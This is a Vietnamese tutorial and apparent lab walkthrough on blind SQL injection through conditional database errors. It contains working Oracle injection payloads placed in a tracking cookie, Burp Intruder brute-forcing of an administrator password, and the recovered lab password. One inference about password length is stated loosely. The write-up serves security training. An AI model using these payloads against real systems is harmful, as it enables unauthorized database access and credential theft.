# Error-based SQL injection

SQL injection dựa trên lỗi xảy ra khi có thể khai thác các thông báo lỗi của cơ sở dữ liệu để trích xuất hoặc suy luận dữ liệu nhạy cảm, ngay cả trong các tình huống **blind SQL injection** (blind SQLi). Mức độ khai thác phụ thuộc vào cách cấu hình cơ sở dữ liệu và các loại lỗi có thể kích hoạt:

**1. Khai thác phản hồi lỗi theo điều kiện boolean**

- Có thể khiến ứng dụng trả về một lỗi cụ thể dựa trên kết quả của một biểu thức điều kiện **boolean**.
- Kỹ thuật này hoạt động tương tự như việc khai thác **blind SQL injection** dựa trên **phản hồi có điều kiện**.

**2. Khai thác lỗi để trích xuất dữ liệu nhạy cảm**

- Một số lỗi có thể chứa dữ liệu từ truy vấn SQL.
- Điều này biến **blind SQL injection** (blind SQLi) thành một lỗi SQL injection có thể nhìn thấy (visible SQLi).

# Exploiting blind SQL injection by triggering conditional errors

Một số ứng dụng thực hiện các truy vấn SQL nhưng hành vi của chúng không thay đổi, bất kể truy vấn có trả về dữ liệu hay không. Kỹ thuật trong phần trước sẽ không hoạt động vì việc chèn các điều kiện boolean khác nhau không tạo ra sự khác biệt trong phản hồi của ứng dụng.

Thường có thể khiến ứng dụng trả về phản hồi khác nhau dựa trên việc xảy ra lỗi SQL. Có thể chỉnh sửa truy vấn để gây ra lỗi cơ sở dữ liệu chỉ khi điều kiện là đúng. Thông thường, một lỗi chưa được xử lý do cơ sở dữ liệu ném ra sẽ gây ra sự khác biệt trong phản hồi của ứng dụng, chẳng hạn như hiển thị thông báo lỗi. Điều này cho phép suy luận tính đúng/sai của điều kiện đã chèn.

# Exploiting blind SQL injection by triggering conditional errors - Continued

Để hiểu cách thức hoạt động của phương pháp này, giả sử có hai yêu cầu được gửi với các giá trị cookie TrackingId sau:

    xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
    xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

Những truy vấn này sử dụng từ khóa **CASE** để kiểm tra một điều kiện và trả về một giá trị khác nhau tùy thuộc vào kết quả của điều kiện đó:

- Với đầu vào đầu tiên, biểu thức **CASE** được đánh giá là **'a'**, không gây ra lỗi nào.

- Với đầu vào thứ hai, biểu thức được đánh giá là **1/0**, gây ra lỗi chia cho 0.

Nếu lỗi này tạo ra sự khác biệt trong phản hồi HTTP của ứng dụng, có thể sử dụng nó để xác định xem điều kiện đã tiêm có đúng hay không.

**Trích xuất dữ liệu bằng phương pháp này**

Sử dụng kỹ thuật này, có thể trích xuất dữ liệu bằng cách kiểm tra từng ký tự một:

    xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

**Lưu ý**: Có nhiều cách khác nhau để kích hoạt lỗi có điều kiện, và mỗi loại cơ sở dữ liệu có phương pháp khai thác tối ưu riêng.

# Lab: Blind SQL injection with conditional errors

![img](128)

Truy cập lab:

![img](129)

Click vào category Tech gifts và intercept request này trong Burp Suite: 

![img](130)

=> Website sử dụng Tracking cookies để theo dõi hành vi người dùng.

Send request, quan sát response: 

![img](131)

Thử thêm dấu **'** vào sau giá trị TrackingId: 

![img](132)

Send request, quan sát response: 

![img](133)

=> Lỗi Internal Server Error. 

Thử thêm một dấu **'** nữa: 

![img](134)

Send request, quan sát response: 

![img](135)

=> Không còn lỗi. Điều này cho thấy rằng lỗi cú pháp (trong trường hợp này là dấu **'** chưa đóng) đang ảnh hưởng rõ ràng đến phản hồi.

Cần xác nhận rằng website đang xử lý payload chèn vào như một truy vấn SQL, tức là lỗi xuất hiện do cú pháp SQL chứ không phải do một loại lỗi khác. Thử chèn một truy vấn con với cú pháp SQL hợp lệ. **'||(SELECT '')||'**:

![img](136)

Send request, quan sát response: 

![img](137)

=> Lỗi Internal Server Error. Có thể là do loại CSDL - thử chỉ định tên bảng có thể dự đoán được trong truy vấn: **'||(SELECT '' FROM dual)||'**:

![img](138)

Send request, quan sát response: 

![img](139)

=> Không còn lỗi. Cho thấy webiste có thể đang sử dụng cơ sở dữ liệu Oracle, luôn yêu cầu tất cả các câu lệnh **SELECT** phải chỉ định rõ ràng tên bảng.

Sau khi gửi một truy vấn có vẻ hợp lệ, thử gửi một truy vấn không hợp lệ nhưng vẫn đảm bảo cú pháp SQL hợp lệ. Thử truy vấn một bảng không tồn tại, sử dụng payload **'||(SELECT '' FROM not-a-real-table)||'**:

![img](140)

Send request, quan sát response: 

![img](141)

Website tiếp tục trả về lỗi. Điều này cho thấy payload chèn vào đang được xử lý như một truy vấn SQL bởi hệ thống backend của website. 

Chỉ cần chèn các truy vấn SQL hợp lệ về mặt cú pháp, có thể sử dụng phản hồi lỗi từ website để suy luận thông tin quan trọng về cơ sở dữ liệu. Ví dụ, để xác minh rằng bảng **users** tồn tại, chèn payload **'||(SELECT '' FROM users WHERE ROWNUM = 1)||'**:

![img](142)

Send request, quan sát response: 

![img](143)

=> Truy vấn này không trả về lỗi, suy ra bảng **users** thực sự tồn tại. Điều kiện **WHERE ROWNUM = 1** rất quan trọng để ngăn truy vấn trả về nhiều hơn một dòng, điều này có thể gây lỗi trong quá trình nối chuỗi.

Tiếp theo thử chèn payload **'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'** để kiểm tra việc sử dụng điều kiện: 

![img](144)

Send request, quan sát response: 

![img](145)

=> Website trả về lỗi. Thử chèn payload **'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'**:

![img](146)

Send request, quan sát response: 

![img](147)

=> Website không trả về lỗi. => Có thể kích hoạt một lỗi một cách có điều kiện dựa trên tính đúng sai của một điều kiện cụ thể.

Câu lệnh **CASE** kiểm tra một điều kiện và trả về một biểu thức nếu điều kiện đúng, và một biểu thức khác nếu điều kiện sai. Biểu thức đầu tiên chứa phép chia cho 0, gây ra lỗi. Trong trường hợp này, hai payload kiểm tra các điều kiện **1=1** và **1=2**, và một lỗi được trả về khi điều kiện đúng.

Có thể sử dụng hành vi này để kiểm tra xem các bản ghi cụ thể có tồn tại trong bảng hay không. Dùng truy vấn **'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'** để kiểm tra xem tên người dùng **administrator** có tồn tại hay không:

![img](148)

Send request, quan sát response: 

![img](149)

=> Lỗi được trả về => điều kiện đúng, có người dùng tên **administrator**. 

Tiếp theo cần xác định độ dài mật khẩu của administrator, sử dụng payload **'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'**: 

![img](150)

Send request, quan sát response: 

![img](151)

=> Lỗi được trả về, điều kiện là đúng, độ dài password > 1. 

Chèn payload **'||(SELECT CASE WHEN LENGTH(password)>20 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'**:

![img](152)

Send request, quan sát response: 

![img](153)

=> Không có lỗi, nghĩa là điều kiện sai => độ dài password = 20. 

Tiếp theo cần thử từng ký tự tương ứng với từng vị trí, send request sang Intruder và thay payload thành **'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'**: 

![img](154)

Chọn vị trí brute-force ở ký tự tương ứng với từng vị trí (='a') 

![img](155)

Chọn payload: 

![img](156)

Start attack, lọc ra những lần thử trả về lỗi 500 vì đó sẽ là ký tự cần tìm:

![img](157)

Tiếp tục thay lần lượt từng vị trí và tấn công lại: 

![img](158)

=> Tìm ra password: twqfdeu25oasvp136962 

Login tài khoản administrator: 

![img](159)

Solved the lab!

![img](160)



1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
twqfdeu25oasvp136962 
















